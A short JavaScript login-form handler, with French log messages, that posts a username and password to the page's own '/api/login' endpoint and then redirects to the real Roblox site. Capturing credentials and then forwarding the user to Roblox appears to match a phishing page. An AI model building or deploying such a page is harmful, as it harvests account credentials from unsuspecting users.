document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('loginForm');

  if (!form) {
    console.error("Erreur : Impossible de trouver le formulaire loginForm !");
    return;
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log("Envoi des données en cours...");

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      const data = await response.json();
      console.log("Réponse du serveur :", data);

      if (data.success) {
        window.location.href = 'https://www.roblox.com';
      }
    } catch (error) {
      console.error('Erreur réseau :', error);
    }
  });
});
